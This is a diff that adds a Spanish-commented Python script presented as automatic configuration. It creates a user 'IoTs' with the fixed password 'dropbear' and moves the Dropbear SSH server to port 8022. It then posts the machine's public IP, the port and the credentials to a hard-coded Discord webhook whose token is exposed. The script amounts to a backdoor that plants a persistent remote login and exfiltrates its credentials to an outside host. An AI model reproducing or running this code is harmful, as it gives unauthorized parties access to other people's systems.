@@ -1,0 +1,105 @@
+
+import subprocess
+import socket
+import requests
+import getpass
+import os
+
+# Configuración
+WEBHOOK_URL = "https://discord.com/api/webhooks/1378044306522374144/TuTos2JmiGC0YxOzSiDnqa6oM5hXZ416lXSQuRlk7rqrCYcD5KED42Njq7RLUUVC3qlU"  # Cambia por tu webhook real
+DEFAULT_PORT = 8022  # Puerto predeterminado para Dropbear
+NEW_USER = "IoTs"
+NEW_PASSWORD = "dropbear"  # Contraseña fija
+
+
+def obtener_ip_publica():
+    """Obtiene la IP pública del servidor"""
+    try:
+        ip_publica = subprocess.check_output(["curl", "-s", "ifconfig.me"]).decode().strip()
+        return ip_publica
+    except:
+        return "No disponible"
+
+
+def crear_usuario():
+    """Crear o actualizar el usuario 'dropbear' con contraseña fija"""
+    try:
+        # Verificar si el usuario existe
+        try:
+            subprocess.run(['id', NEW_USER], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+            print(f"[+] Usuario {NEW_USER} ya existe.")
+        except:
+            # Si no existe, crearlo
+            subprocess.run(['sudo', 'useradd', '-m', '-s', '/bin/bash', NEW_USER], check=True)
+            print(f"[+] Usuario {NEW_USER} creado.")
+
+        # Establecer contraseña fija
+        subprocess.run(['sudo', 'passwd', NEW_USER], input=f"{NEW_PASSWORD}\n{NEW_PASSWORD}".encode(), check=True)
+        print(f"[+] Contraseña del usuario {NEW_USER} configurada como '{NEW_PASSWORD}'.")
+    except Exception as e:
+        print(f"[!] Error al crear/configurar el usuario: {e}")
+
+
+def configurar_dropbear(port):
+    """Configurar Dropbear con un puerto específico"""
+
+    # Editar configuración de Dropbear
+    with open("/etc/default/dropbear", "w") as f:
+        f.write(f'DROPBEAR_PORT="{port}"\n')
+        f.write('DROPBEAR_EXTRA_ARGS=""\n')
+        f.write('DROPBEAR_BANNER=""\n')
+
+    # Reiniciar servicio
+    subprocess.run(['sudo', 'service', 'dropbear', 'restart'], check=True)
+    print(f"[+] Dropbear configurado en el puerto {port}.")
+
+
+def enviar_webhook(ip, port, user, password):
+    """Enviar datos al webhook"""
+    mensaje = {
+        "content": None,
+        "embeds": [
+            {
+                "title": "Nuevo acceso SSH creado",
+                "description": "Detalles de conexión generados automáticamente.",
+                "color": 65280,
+                "fields": [
+                    {"name": "IP Pública", "value": ip, "inline": True},
+                    {"name": "Puerto SSH", "value": str(port), "inline": True},
+                    {"name": "Usuario", "value": user, "inline": True},
+                    {"name": "Contraseña", "value": password, "inline": False}
+                ]
+            }
+        ]
+    }
+
+    try:
+        response = requests.post(WEBHOOK_URL, json=mensaje)
+        if response.status_code == 204:
+            print("[+] Información enviada correctamente al webhook.")
+        else:
+            print(f"[!] Error al enviar al webhook: {response.status_code}")
+    except Exception as e:
+        print(f"[!] Error al enviar webhook: {e}")
+
+
+def main():
+    print("[*] Iniciando configuración automática...")
+    
+    # Obtener IP pública
+    ip_publica = obtener_ip_publica()
+
+    # Crear o actualizar usuario
+    crear_usuario()
+
+    # Configurar Dropbear
+    configurar_dropbear(DEFAULT_PORT)
+
+    # Enviar información al webhook
+    enviar_webhook(ip_publica, DEFAULT_PORT, NEW_USER, NEW_PASSWORD)
+
+    print("[*] Proceso finalizado.")
+
+
+if __name__ == "__main__":
+    main()
